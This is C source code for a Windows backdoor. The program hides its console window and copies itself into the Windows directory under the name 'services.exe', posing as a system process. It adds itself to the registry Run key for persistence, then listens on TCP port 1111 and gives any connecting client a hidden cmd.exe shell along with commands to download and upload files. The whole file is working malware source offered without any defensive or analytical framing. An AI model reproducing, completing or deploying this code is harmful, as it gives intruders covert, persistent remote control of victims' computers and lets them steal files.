//includes
#include <windows.h>
#include <winsock.h>
#include <wininet.h>
#include <small.h>

#include "..\\Includes\\Includes.h"
#include "..\\Includes\\Small.h"

//consts
#define PORT 1111
#define SLEEP_TIME 500
#define szExit "exit\r\n"
#define szError "Some shit happend"

#define szRegshit "666"
#define szName    "\\services.exe"

#define szMtx   "-. .-"
//              |  €  |
//               \___/

//main function
int main()
{
 WSADATA wsa;
 struct sockaddr_in sin;
 struct sockaddr_in sa = {0};

 char szbuff[MAX_BUFF];
 char szFile[MAX_PATH];

 int a_sock,sock;

 SECURITY_ATTRIBUTES sec_att;
 STARTUPINFO startup_info;
 HANDLE hReadPip1,hReadPip2;
 HANDLE hWritePip1,hWritePip2;
 HKEY hKey;

 unsigned long dwBytesR;
 unsigned long ulWrite;

 unsigned int uSize;
 unsigned int uSend;
 unsigned int uMove;
 unsigned int uMode;
 unsigned int uByteS;

 int rsize;

 HANDLE hFile;

 //Hide Console window | CreateMutex because we only need one our running
 //process | Copy itself to win dir | Autorun shit |

  ShowWindow(FindWindow("ConsoleWindowClass",0),0);

  CreateMutex(0,FALSE, szMtx);

  if(GetLastError() == ERROR_ALREADY_EXISTS)
  {
   ExitProcess(0);
  }

  GetWindowsDirectory(szbuff,sizeof(szbuff));
  lstrcat(szbuff,szName);

  GetModuleFileName(GetModuleHandle(0),szFile,sizeof(szFile));
  
  if(RegCreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey) == ERROR_SUCCESS)
  {
   RegSetValueEx(hKey,szRegshit,0,REG_SZ,szbuff,sizeof(szbuff));
   RegCloseKey(hKey);
  }

  if(lstrcmp(szbuff,szFile))
  {
   CopyFile(szFile,szbuff,FALSE);
   ShellExecute(0, "open",szbuff,0,0,SW_HIDE);
   ExitProcess(0);
  }

 //Initialize winsock library
  WSAStartup(0x101,&wsa);

  //Create socket
  a_sock = socket(AF_INET,SOCK_STREAM,0);

  //If cant create socket exit
  if(a_sock == 0)
  {
   return -1;
  }

  //fill structure 
  sin.sin_family = AF_INET; //TCP
  sin.sin_addr.s_addr = INADDR_ANY; //Accept any ip
  sin.sin_port = htons(PORT); //listen on this port

  //try to bind socket to port | error -> exit
  if(bind(a_sock,(SOCKADDR *)&sin,sizeof(sin)) != 0)
  {
   return -1;
  }

  //listen and accept only one connection | error -> exit
  if(listen(a_sock,1) != 0)
  {
   return -1;
  }

  //Loop forever
  while(1)
  {
   //Accept incoming connection
   sock = accept(a_sock,0,0);
   
   //error -> loop again
   if(sock == INVALID_SOCKET)continue;

   //fill structure
   sec_att.lpSecurityDescriptor = 0; // default security descriptor
   sec_att.bInheritHandle = TRUE; 
   sec_att.nLength = sizeof(SECURITY_ATTRIBUTES); // sizeof(SECURITY_ATTRIBUTES) struct

   //create the pipes for our command promp
   CreatePipe(&hReadPip1,&hWritePip1,&sec_att,0);
   CreatePipe(&hReadPip2,&hWritePip2,&sec_att,0);

   //The GetStartupInfo function retrieves the contents of the 
   //STARTUPINFO structure that was specified when the calling 
   //process was created.(MSDN)
   GetStartupInfo(&startup_info);

   //fill structure
   startup_info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //standard input/output
   startup_info.wShowWindow = SW_HIDE; //hide window
   startup_info.hStdOutput = startup_info.hStdError = hWritePip1; //hWritePip1 is handle for output
   startup_info.hStdInput = hReadPip2; //and hReadPip2 is handle for input

   //run cmd
   CreateProcess(0,"cmd.exe",0,0,TRUE,CREATE_NEW_CONSOLE,0,0,&startup_info,(PROCESS_INFORMATION*)&startup_info);

   //Loop forever again :)

   while(1)
   {
	Sleep(SLEEP_TIME); //Sleep

    //Check do we have something ?
    if(PeekNamedPipe(hReadPip1,&szbuff[1],MAX_BUFF,&dwBytesR,0,0) == 0)
	{
	 break;
	}

	if(dwBytesR) 
    {
	 //First char means something (download,upload,standard command)

	 szbuff[0] = DEFAULT_MARK;

     //read data from cmd.exe
     if(ReadFile(hReadPip1,&szbuff[1],dwBytesR,&dwBytesR,0) == 0)
	 {
	  break;
	 }
     
	 //send it to client
     if(send(sock,szbuff,dwBytesR+1,0) <= 0)
	 {
	  break;
	 }

	 dwBytesR = 0;
    }
    else
    {
	 //clear buff
 	 ZeroMemory(szbuff,MAX_BUFF);

	 //recive buffer
     dwBytesR=rsize=recv(sock,szbuff,MAX_BUFF-1,0);

	 //if some error happens break this loop
	 if(rsize <= 0)
	 {
	  break;
	 }
   
	 //does client send "exit" string
	 if(strncmp(&szbuff[1],szExit,lstrlen(szExit)) == 0)
	 {
	  break;
	 }
   
	 //add END_MARK on szbuff
	 lstrcat(szbuff,END_MARK);

	 //Check what client sends
	 switch(szbuff[0])
	 {
	 case DEFAULT_MARK:
		  //This means simple command
		  //Write it to cmd.exe
		  WriteFile(hWritePip2,&szbuff[1],dwBytesR,&dwBytesR,0);
		  break;

	 case DOWNLOAD_MARK:
          //Client wants to download something

		  //Remove END_MARK
		  szbuff[lstrlen(szbuff)-4] = '\0';
		  
		  //Open file for reading
		  hFile = CreateFile(&szbuff[lstrlen(DOWNLOAD)+2],GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		  
		  //Can't open file
		  if(hFile == INVALID_HANDLE_VALUE)
		  {
		   //send(sock,szError,lstrlen(szError),0);
		   break;
		  }

		  //Get File size
		  uSize = GetFileSize(hFile,0);

		  //put that size into szbuff with specific mark at the beggining
		  wsprintf(szbuff,"%c%d",FILESIZE_MARK,uSize);

		  //send it to client
		  uByteS = send(sock,szbuff,lstrlen(szbuff),0);

		  //error -> break loop
		  if(uByteS <= 0)
		  {
		   break;
		  }

		  //put in szbuff download_mark char because client will know
		  //that is server sending file

		  szbuff[0] = DOWNLOAD_MARK;

		  //loop while uSize is positive number
		  while(uSize)
		  {
		   //Zero szbuff exept first char(DOWNLOAD_MARK)
		   ZeroMemory(&szbuff[1],MAX_BUFF-1);

		   uSend = MAX_BUFF-2;

		   //Do I need explain this ? blah
		   if(uSend>uSize)
		   {
		    uSend=uSize;
		   } 

		   //If uSize is smaller or equal to ZERO break
		   if((int)uSize <= 0)
		   {
		    break;
		   }

		   //uMove is holding position in file
		   uMove = 0-uSize;

		   //set position to uMove in file from end file
		   SetFilePointer(hFile,uMove,0,FILE_END);

		   //read that part from file and put it into szbuff
		   ReadFile(hFile,&szbuff[1],uSend,&uMode,0);

		   //send it to client
		   uByteS = send(sock,szbuff,uSend+1,0);

		   //error -> break
		   if(uByteS == SOCKET_ERROR)
		   {
		    break;
		   }

		   //Substract sended bytes from uSize
		   uSize = uSize - uSend;

		  }
       
		  //Close handle
		  CloseHandle(hFile);

		  break;

	 case UPLOAD_MARK:
          //Uploading file

		  //Open file for writing
		  hFile = CreateFile(szFile,GENERIC_WRITE,0,0,OPEN_ALWAYS,0,0);

		  //Can't create file
		  if(hFile == INVALID_HANDLE_VALUE) 
		  {
		   //send(sock,szError,lstrlen(szError),0);
		   break;
		  }

		  //While client doesn't send ENDF_MARK
		  while(szbuff[0] != ENDF_MARK)
		  {
		   //Set the pointer at end of file
		   SetFilePointer(hFile,0,0,FILE_END);

		   //Write szbuff to file
		   WriteFile(hFile,&szbuff[1],rsize-1,&ulWrite,0);

		   //Zero szbuff
		   ZeroMemory(szbuff,MAX_BUFF);
          
		   //receive buffer
           rsize=recv(sock,szbuff,MAX_BUFF-1,0);

		   //error break
		   if(rsize <= 0)
		   {
			break;
		   }
		  }

		  //Close Handle
		  CloseHandle(hFile);

	      break;

	 case FILESIZE_MARK:
		  //Convert file size into number
		  uSize = atoi(&szbuff[1]);
		  break;

	 case FILENAME_MARK:
          //get File name that client sends

		  //remove last 4 bytes
		  szbuff[lstrlen(szbuff)-4] = '\0';

		  //copy it to szFile
		  lstrcpy(szFile,&szbuff[1]);

		  //put upload mark into szbuff
		  szbuff[0] = UPLOAD_MARK;
		  szbuff[1] = '\0';

		  //send it to client
		  send(sock,szbuff,lstrlen(szbuff),0);

	      break;
	 }
    }
   }

   //write "exit" command to cmd.exe
   WriteFile(hWritePip2,szExit,lstrlen(szExit),&dwBytesR,0);

   //Close handles
   CloseHandle(hWritePip2);
   CloseHandle(hReadPip1);
   CloseHandle(hWritePip1);
   CloseHandle(hReadPip2);

   //Close socket
   closesocket(sock);

  }
  //Close socket
  closesocket(a_sock);
  closesocket(sock);
  WSACleanup();
  //Exit
 return 0;
}

//----------------LIBS----------------+
#pragma comment(lib,"wsock32.lib")
#pragma comment(lib,"wininet.lib")
